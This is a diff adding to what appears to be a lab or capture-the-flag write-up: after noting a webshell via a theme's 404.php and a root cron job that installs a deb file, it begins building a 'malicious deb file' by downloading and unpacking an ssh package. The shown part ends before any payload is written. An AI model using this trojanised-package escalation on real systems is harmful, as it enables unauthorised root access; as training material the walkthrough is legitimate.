@@ -730,6 +730,61 @@ navigate to the path `10.150.150.21/wp-content/themes/twentynineteen/404.php?cmd
 
 running `pspy` we can see a cron job running as root to download and install the deb file. 
 
+> creating a malicious deb file
+
+```shell
+┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PTD/Exploit/mal_deb]
+└─$ wget http://de.archive.ubuntu.com/ubuntu/pool/main/o/openssh/ssh_8.2p1-4_all.deb 
+--2025-05-25 12:56:19--  http://de.archive.ubuntu.com/ubuntu/pool/main/o/openssh/ssh_8.2p1-4_all.deb
+Resolving de.archive.ubuntu.com (de.archive.ubuntu.com)... 141.30.62.24, 141.30.62.26, 141.30.62.25, ...
+Connecting to de.archive.ubuntu.com (de.archive.ubuntu.com)|141.30.62.24|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5072 (5.0K) [application/vnd.debian.binary-package]
+Saving to: ‘ssh_8.2p1-4_all.deb’
+
+ssh_8.2p1-4_all.deb                                                            100%[====================================================================================================================================================================================================>]   4.95K  --.-KB/s    in 0.001s  
+
+2025-05-25 12:56:25 (5.05 MB/s) - ‘ssh_8.2p1-4_all.deb’ saved [5072/5072]
+                                            
+┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PTD/Exploit/mal_deb]
+└─$ ls -al 
+total 16
+drwxrwxr-x 2 n16hth4wk n16hth4wk 4096 May 25 12:56 .
+drwxrwxr-x 7 n16hth4wk n16hth4wk 4096 May 25 12:24 ..
+-rw-rw-r-- 1 n16hth4wk n16hth4wk 5072 Feb 26  2020 ssh_8.2p1-4_all.deb
+```
+first download the deb file. 
+
+```shell
+┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PTD/Exploit/mal_deb]
+└─$ mkdir work                                  
+┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PTD/Exploit/mal_deb]
+└─$ dpkg -x ssh_8.2p1-4_all.deb work
+┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PTD/Exploit/mal_deb]
+└─$ cd work   
+┌──(n16hth4wk㉿n16hth4wk-sec)-[~/…/PTD/Exploit/mal_deb/work]
+└─$ mkdir DEBIAN
+┌──(n16hth4wk㉿n16hth4wk-sec)-[~/…/PTD/Exploit/mal_deb/work]
+└─$ ls -al 
+total 16
+drwxr-xr-x 4 n16hth4wk n16hth4wk 4096 May 25 12:58 .
+drwxrwxr-x 3 n16hth4wk n16hth4wk 4096 May 25 12:57 ..
+drwxrwxr-x 2 n16hth4wk n16hth4wk 4096 May 25 12:58 DEBIAN
+drwxr-xr-x 3 n16hth4wk n16hth4wk 4096 Feb 26  2020 usr
+```
+extract the deb file to a director which `work` was created for. then create another directory `DEBIAN` 
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
